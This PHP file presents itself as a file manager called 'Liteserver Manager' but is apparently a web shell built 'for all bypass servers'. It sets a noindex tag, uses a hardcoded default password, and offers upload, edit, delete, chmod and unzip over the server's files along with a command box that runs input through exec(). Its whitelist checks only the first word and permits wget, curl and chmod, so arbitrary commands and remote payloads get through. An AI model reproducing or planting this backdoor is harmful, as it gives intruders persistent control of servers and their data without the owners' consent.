<meta name="robots" content="noindex">
<?php
/*
Github:https://github.com/liteservermanager/

Liteserver Manager

Created by Rahmat for all bypass servers

*/

session_start();
$BASE_DIR = realpath(__DIR__);
$ADMIN_USER = 'admin';
$ADMIN_PASS = 'liteservermanager'; // change password here
$ENABLE_CMD = true;  
$CMD_WHITELIST = ['ls','pwd','df','uptime','whoami','id','dir','wget','curl','chmod','mv','cp'];
$MAX_UPLOAD_MB = 80;
function h($s){ return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); }
function within_base($path){ global $BASE_DIR; $r = realpath($path); return $r !== false && strpos($r, $BASE_DIR) === 0 ? $r : false; }
if(!isset($_SESSION['lsm_token'])) $_SESSION['lsm_token'] = bin2hex(random_bytes(12));
$TOKEN = $_SESSION['lsm_token'];

function show_login($msg=''){
    global $TOKEN;
    ?>
    <!doctype html>
    <html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
    <script src="https://cdn.tailwindcss.com"></script>
    <title>Liteserver Manager - Login</title>
    </head><body class="bg-slate-900 text-slate-100 antialiased">
    <div class="min-h-screen flex items-center justify-center">
      <div class="w-full max-w-md bg-slate-800/60 backdrop-blur rounded-xl shadow-lg p-6 border border-slate-700">
        <h2 class="text-2xl font-semibold mb-4">Liteserver Manager</h2>
        <?php if($msg): ?><div class="mb-3 text-sm text-amber-200 bg-amber-900/20 p-2 rounded"><?php echo h($msg); ?></div><?php endif; ?>
        <form method="post" class="space-y-3">
          <input type="hidden" name="action" value="login">
          <input type="hidden" name="token" value="<?php echo $TOKEN; ?>">
          <label class="block text-sm">Username</label>
          <input name="user" required class="mt-1 w-full rounded px-3 py-2 bg-slate-900 border border-slate-700">
          <label class="block text-sm">Password</label>
          <input type="password" name="pass" required class="mt-1 w-full rounded px-3 py-2 bg-slate-900 border border-slate-700">
          <div class="flex gap-2">
            <button class="flex-1 bg-emerald-500 hover:bg-emerald-600 text-white rounded px-4 py-2">Login</button>
          </div>
        </form>
        <p class="mt-3 text-xs text-slate-400">v.1</p>
      </div>
    </div>
    </body></html>
    <?php
    exit;
}

$req_action = $_REQUEST['action'] ?? '';
if($req_action === 'login'){
    if(($_POST['token'] ?? '') !== $TOKEN) show_login('Invalid token');
    $u = $_POST['user'] ?? ''; $p = $_POST['pass'] ?? '';
    if($u === $ADMIN_USER && $p === $ADMIN_PASS){ $_SESSION['lsm_user'] = $ADMIN_USER; header('Location: '.strtok($_SERVER['REQUEST_URI'] ?? '/', '?')); exit; }
    else show_login('Login failed');
}

if(isset($_GET['demo']) && $_GET['demo'] == '1'){ show_login('Demo login - interface only'); }
if(!isset($_SESSION['lsm_user']) || $_SESSION['lsm_user'] !== $ADMIN_USER){ show_login(); }

$cwd = within_base($_GET['dir'] ?? ($_POST['dir'] ?? $BASE_DIR));
if($cwd === false) $cwd = $BASE_DIR;

if($_SERVER['REQUEST_METHOD'] === 'POST'){
    if(($_POST['token'] ?? '') !== $TOKEN){ $_SESSION['flash'] = 'Invalid token'; header('Location: ?dir='.urlencode($cwd)); exit; }
    $act = $_POST['action'] ?? '';
    switch($act){
        case 'upload':
            if(!isset($_FILES['file'])){ $_SESSION['flash']='No file selected'; break; }
            $f = $_FILES['file']; if($f['error']!==UPLOAD_ERR_OK){ $_SESSION['flash']='Upload error'; break; }
            if($f['size'] > $MAX_UPLOAD_MB*1024*1024){ $_SESSION['flash']='File too large'; break; }
            $dst = $cwd . DIRECTORY_SEPARATOR . basename($f['name']);
            $_SESSION['flash'] = move_uploaded_file($f['tmp_name'],$dst) ? 'Uploaded: '.basename($f['name']) : 'Move failed';
            break;
        case 'mkdir':
            $n = trim(basename($_POST['dirname'] ?? ''));
            if($n){ $_SESSION['flash'] = @mkdir($cwd.DIRECTORY_SEPARATOR.$n) ? 'Folder created' : 'Failed to create folder'; }
            break;
        case 'newfile':
            $n = trim(basename($_POST['filename'] ?? ''));
            if($n){ 
                $path = $cwd.DIRECTORY_SEPARATOR.$n; 
                if(!file_exists($path) && @file_put_contents($path,'') !== false){ 
                    $_SESSION['flash']='New file created'; 
                    header('Location: ?action=edit&file='.urlencode($path)); exit; 
                } else $_SESSION['flash']='Failed to create file (maybe already exists)'; 
            }
            break;
        case 'delete':
            $target = within_base($cwd.DIRECTORY_SEPARATOR.($_POST['name'] ?? ''));
            if($target && file_exists($target)){
                if(is_dir($target)){
                    $ok = rrmdir($target); $_SESSION['flash'] = $ok ? 'Folder deleted' : 'Failed to delete folder';
                } else { $_SESSION['flash'] = unlink($target) ? 'File deleted' : 'Failed to delete file'; }
            } else $_SESSION['flash']='Target not found';
            break;
        case 'rename':
            $old = within_base($cwd.DIRECTORY_SEPARATOR.($_POST['oldname'] ?? ''));
            $newname = basename($_POST['newname'] ?? '');
            $new = $cwd.DIRECTORY_SEPARATOR.$newname;
            if($old && file_exists($old)){ $_SESSION['flash'] = @rename($old,$new) ? 'Rename success' : 'Rename failed'; }
            else $_SESSION['flash']='Target not found';
            break;
        case 'chmod':
            $target = within_base($cwd.DIRECTORY_SEPARATOR.($_POST['name'] ?? ''));
            $mode_raw = $_POST['mode'] ?? '';
            if($target && file_exists($target) && preg_match('/^[0-7]{3,4}$/',$mode_raw)){ 
                $mode = intval($mode_raw,8); 
                $_SESSION['flash'] = @chmod($target,$mode) ? 'Permission changed successfully' : 'Permission change failed'; 
            } else $_SESSION['flash']='Invalid input';
            break;
        case 'unzip':
            $target = within_base($cwd.DIRECTORY_SEPARATOR.($_POST['name'] ?? ''));
            if($target && extension_loaded('zip')){ 
                $zip = new ZipArchive(); 
                if($zip->open($target) === true){ 
                    $zip->extractTo($cwd); 
                    $zip->close(); 
                    $_SESSION['flash']='Unzip successful'; 
                } else $_SESSION['flash']='Failed to open zip'; 
            } else $_SESSION['flash']='Zip extension not available or file not found';
            break;
        case 'save':
            $target = within_base($cwd.DIRECTORY_SEPARATOR.($_POST['name'] ?? ''));
            if($target && is_file($target) && is_writable($target)){
                $content = $_POST['content'] ?? '';
                $ok = file_put_contents($target,$content) !== false;
                $_SESSION['flash'] = $ok ? 'Saved successfully' : 'Failed to save';
                if(isset($_POST['continue']) && $_POST['continue']=='1'){ header('Location: ?action=edit&name='.urlencode(basename($target)).'&dir='.urlencode(dirname($target))); exit; }
            } else $_SESSION['flash']='File not writable';
            break;
        case 'cmd':
            if(!$ENABLE_CMD){ $_SESSION['flash']='Command execution is disabled in configuration'; break; }
            $cmd = trim($_POST['cmd'] ?? ''); if(!$cmd){ $_SESSION['flash']='No command entered'; break; }
            if(!empty($CMD_WHITELIST)){ 
                $parts = preg_split('/\s+/',$cmd); 
                if(!in_array($parts[0], $CMD_WHITELIST)){ $_SESSION['flash']='Command not allowed'; break; } 
            }
            exec($cmd . ' 2>&1', $out, $ret); $_SESSION['cmd_output'] = implode("\n", $out); $_SESSION['flash'] = "Exit code: $ret";
            break;
        case 'logout':
            session_destroy(); header('Location: '.strtok($_SERVER['REQUEST_URI'],'?')); exit;
            break;
    }
    header('Location: '.strtok($_SERVER['REQUEST_URI'],'?').'?dir='.urlencode($cwd)); exit;
}

if(($_GET['action'] ?? '') === 'download'){
    $file = within_base(($cwd.DIRECTORY_SEPARATOR).($_GET['name'] ?? ''));
    if($file && is_file($file)){
        header('Content-Description: File Transfer'); 
        header('Content-Type: application/octet-stream'); 
        header('Content-Disposition: attachment; filename="'.basename($file).'"'); 
        header('Content-Length: '.filesize($file)); 
        readfile($file); exit;
    } else { echo 'File not found'; exit; }
}

if(($_GET['action'] ?? '') === 'edit'){
    $name = $_GET['name'] ?? ($_GET['file'] ?? '');
    $dir = $_GET['dir'] ?? $cwd;
    $file = within_base(($dir===""?"":"$dir/").$name);
    if(!$file || !is_file($file)){ echo 'File successfully created'; exit; }
    $content = file_get_contents($file);
    ?>
    <!doctype html>
    <html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><script src="https://cdn.tailwindcss.com"></script><title>Edit - <?php echo h(basename($file)); ?></title></head>
    <body class="bg-slate-900 text-slate-100 p-6"><div class="max-w-5xl mx-auto"><a href="?dir=<?php echo urlencode(dirname($file)); ?>" class="text-sm text-slate-300 hover:underline">← Back</a>
    <h2 class="text-xl font-semibold mt-3">Edit: <?php echo h(basename($file)); ?></h2>
    <form method="post">
      <input type="hidden" name="token" value="<?php echo $TOKEN; ?>">
      <input type="hidden" name="action" value="save">
      <input type="hidden" name="dir" value="<?php echo h(dirname($file)); ?>">
      <input type="hidden" name="name" value="<?php echo h(basename($file)); ?>">
      <textarea name="content" class="w-full h-[60vh] bg-slate-800 p-3 rounded text-sm font-mono"><?php echo h($content); ?></textarea>
      <div class="mt-3 flex gap-2">
        <button class="bg-sky-500 hover:bg-sky-600 text-white px-4 py-2 rounded">Save</button>
        <button type="submit" name="continue" value="1" class="bg-emerald-500 hover:bg-emerald-600 text-white px-4 py-2 rounded">Save & Continue</button>
        <a href="?dir=<?php echo urlencode(dirname($file)); ?>" class="px-4 py-2 rounded bg-slate-700/40">Cancel</a>
      </div>
    </form></div></body></html>
    <?php
    exit;
}

function rrmdir($dir){ if(!is_dir($dir)) return false; $items=array_diff(scandir($dir),['.','..']); foreach($items as $it){ $p=$dir.DIRECTORY_SEPARATOR.$it; if(is_dir($p)) rrmdir($p); else @unlink($p); } return @rmdir($dir); }

$items = array_values(array_filter(scandir($cwd), function($a){ return $a !== '.'; }));
?>
<!doctype html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><script src="https://cdn.tailwindcss.com"></script><title>Liteserver Manager</title></head>
<body class="bg-slate-900 text-slate-100 antialiased p-6">
<div class="max-w-6xl mx-auto">
  <header class="flex items-center justify-between mb-6">
    <div>
      <h1 class="text-2xl font-bold">Liteserver Manager <span class="text-sky-400 text-sm">bypass</span></h1>
      <div class="text-sm text-slate-400 mt-1">IP: <?php echo h($_SERVER['SERVER_ADDR'] ?? '127.0.0.1'); ?> | OS: <?php echo h(php_uname()); ?></div>
    </div>
    <div class="flex items-center gap-3">
      <form method="post" onsubmit="return confirm('Logout?')">
        <input type="hidden" name="token" value="<?php echo $TOKEN; ?>">
        <input type="hidden" name="action" value="logout">
        <button class="bg-red-600 px-3 py-2 rounded">Logout</button>
      </form>
    </div>
  </header>
  <?php if(isset($_SESSION['flash'])){ echo '<div class="mb-4 p-3 rounded bg-slate-800 border border-slate-700">'.h($_SESSION['flash']).'</div>'; unset($_SESSION['flash']); } ?>
  <div class="bg-slate-800 p-4 rounded-lg border border-slate-700 mb-4">
    <div class="flex items-center justify-between">
      <div class="text-sm">Current: <span class="font-mono text-sky-300"><?php echo h($cwd); ?></span></div>
      <div class="flex gap-2">
        <form method="get" class="flex gap-2">
          <input type="hidden" name="action" value="list">
          <input class="px-3 py-2 rounded bg-slate-900 border border-slate-700 text-sm" name="dir" value="<?php echo h($cwd); ?>">
          <button class="bg-sky-500 px-3 py-2 rounded">Go</button>
        </form>
      </div>
    </div>
    <div class="mt-3 grid grid-cols-3 gap-3">
      <form method="post" enctype="multipart/form-data" class="flex items-center gap-2">
        <input type="hidden" name="token" value="<?php echo $TOKEN; ?>">
        <input type="hidden" name="action" value="upload">
        <input type="hidden" name="dir" value="<?php echo h($cwd); ?>">
        <input type="file" name="file" class="text-sm text-slate-300">
        <button class="bg-emerald-500 px-3 py-2 rounded text-sm">📤 Upload</button>
      </form>
      <form method="post" class="flex items-center gap-2">
        <input type="hidden" name="token" value="<?php echo $TOKEN; ?>">
        <input type="hidden" name="action" value="mkdir">
        <input type="hidden" name="dir" value="<?php echo h($cwd); ?>">
        <input name="dirname" placeholder="New folder name" class="px-3 py-2 rounded bg-slate-900 border border-slate-700 text-sm">
        <button class="bg-sky-500 px-3 py-2 rounded text-sm">📁 New Folder</button>
      </form>
      <form method="post" class="flex items-center gap-2">
        <input type="hidden" name="token" value="<?php echo $TOKEN; ?>">
        <input type="hidden" name="action" value="newfile">
        <input type="hidden" name="dir" value="<?php echo h($cwd); ?>">
        <input name="filename" placeholder="New file name" class="px-3 py-2 rounded bg-slate-900 border border-slate-700 text-sm">
        <button class="bg-sky-500 px-3 py-2 rounded text-sm">📝 New File</button>
      </form>
      <form method="post" class="flex items-center gap-2">
        <input type="hidden" name="token" value="<?php echo $TOKEN; ?>">
        <input type="hidden" name="action" value="chmod">
        <input type="hidden" name="dir" value="<?php echo h($cwd); ?>">
        <input name="name" placeholder="file/folder" class="px-3 py-2 rounded bg-slate-900 border border-slate-700 text-sm">
        <input name="mode" placeholder="0755" class="px-3 py-2 rounded bg-slate-900 border border-slate-700 text-sm w-24">
        <button class="bg-yellow-500 px-3 py-2 rounded text-sm">🔒 Change Permission</button>
      </form>
    </div>
  </div>
  <div class="overflow-x-auto bg-slate-800 rounded-lg border border-slate-700">
    <table class="min-w-full divide-y divide-slate-700">
      <thead class="bg-slate-900/30">
        <tr class="text-left text-sm text-slate-300"><th class="px-4 py-3">Name</th><th class="px-4 py-3 w-28">Perm</th><th class="px-4 py-3 w-28">Size</th><th class="px-4 py-3 w-72">Actions</th></tr>
      </thead>
      <tbody class="text-sm">
        <?php foreach($items as $it):
          $p = $cwd . DIRECTORY_SEPARATOR . $it;
          $isdir = is_dir($p);
          $perms = substr(sprintf('%o', fileperms($p)), -4);
        ?>
        <tr class="hover:bg-slate-900/40 border-t border-slate-800">
          <td class="px-4 py-3 flex items-center gap-3"><span class="text-xl"><?php echo $isdir? '📁':'📄'; ?></span>
            <div>
              <div class="font-medium"><?php echo h($it); ?></div>
              <div class="text-xs text-slate-400"><?php echo h($isdir? 'Folder' : pathinfo($it, PATHINFO_EXTENSION)); ?></div>
            </div>
          </td>
          <td class="px-4 py-3 font-mono"><?php echo h($perms); ?></td>
          <td class="px-4 py-3"><?php echo $isdir? '-' : number_format(filesize($p)); ?></td>
          <td class="px-4 py-3">
            <div class="flex gap-2">
              <?php if($isdir): ?>
                <a class="px-3 py-2 rounded bg-sky-500 text-white text-sm" href="?dir=<?php echo urlencode($p); ?>">Open</a>
              <?php else: ?>
                <a class="px-3 py-2 rounded bg-sky-500 text-white text-sm" href="?action=edit&dir=<?php echo urlencode($cwd); ?>&name=<?php echo urlencode($it); ?>">Edit</a>
                <a class="px-3 py-2 rounded bg-emerald-600 text-white text-sm" href="?action=download&dir=<?php echo urlencode($cwd); ?>&name=<?php echo urlencode($it); ?>">Download</a>
              <?php endif; ?>
              <form method="post" style="display:inline">
                <input type="hidden" name="token" value="<?php echo $TOKEN; ?>">
                <input type="hidden" name="action" value="delete">
                <input type="hidden" name="dir" value="<?php echo h($cwd); ?>">
                <input type="hidden" name="name" value="<?php echo h($it); ?>">
                <button class="px-3 py-2 rounded bg-red-600 text-white text-sm" onclick="return confirm('Hapus <?php echo h($it); ?> ?')">Delete</button>
              </form>
              <button class="px-3 py-2 rounded bg-slate-700 text-white text-sm" onclick="toggleRename('<?php echo md5($it); ?>')">Rename</button>
              <?php if(!$isdir && strtolower(pathinfo($it,PATHINFO_EXTENSION)) === 'zip'): ?>
                <form method="post" style="display:inline">
                  <input type="hidden" name="token" value="<?php echo $TOKEN; ?>">
                  <input type="hidden" name="action" value="unzip">
                  <input type="hidden" name="dir" value="<?php echo h($cwd); ?>">
                  <input type="hidden" name="name" value="<?php echo h($it); ?>">
                  <button class="px-3 py-2 rounded bg-indigo-600 text-white text-sm">Unzip</button>
                </form>
              <?php endif; ?>
            </div>
            <div id="rename-<?php echo md5($it); ?>" style="display:none;" class="mt-2">
              <form method="post" class="flex gap-2">
                <input type="hidden" name="token" value="<?php echo $TOKEN; ?>">
                <input type="hidden" name="action" value="rename">
                <input type="hidden" name="dir" value="<?php echo h($cwd); ?>">
                <input type="hidden" name="oldname" value="<?php echo h($it); ?>">
                <input name="newname" value="<?php echo h($it); ?>" class="px-2 py-1 rounded bg-slate-900 border border-slate-700 text-sm">
                <button class="px-3 py-1 rounded bg-sky-500 text-sm">OK</button>
                <button type="button" onclick="toggleRename('<?php echo md5($it); ?>')" class="px-3 py-1 rounded bg-slate-600 text-sm">Cancel</button>
              </form>
            </div>
          </td>
        </tr>
        <?php endforeach; ?>
      </tbody>
    </table>
  </div>
  <div class="mt-4">
    <form method="post" class="flex gap-2 items-center">
      <input type="hidden" name="token" value="<?php echo $TOKEN; ?>"><input type="hidden" name="action" value="cmd"><input type="hidden" name="dir" value="<?php echo h($cwd); ?>">
      <input name="cmd" placeholder="Command" class="flex-1 px-3 py-2 rounded bg-slate-900 border border-slate-700 text-sm">
      <button class="px-3 py-2 rounded bg-violet-500 text-white">Run</button>
    </form>
    <?php if(isset($_SESSION['cmd_output'])){ echo '<pre class="mt-3 p-3 rounded bg-black/60 text-xs">'.h($_SESSION['cmd_output']).'</pre>'; unset($_SESSION['cmd_output']); } ?>
  </div>
  <p class="mt-6 text-xs text-slate-400">Created by Rahmat 2025 All Right Reserved.</p>
</div>
<script>
function toggleRename(id){ var el=document.getElementById('rename-'+id); if(!el) return; el.style.display=(el.style.display==='none'||el.style.display==='')?'block':'none'; }
</script>
</body></html>
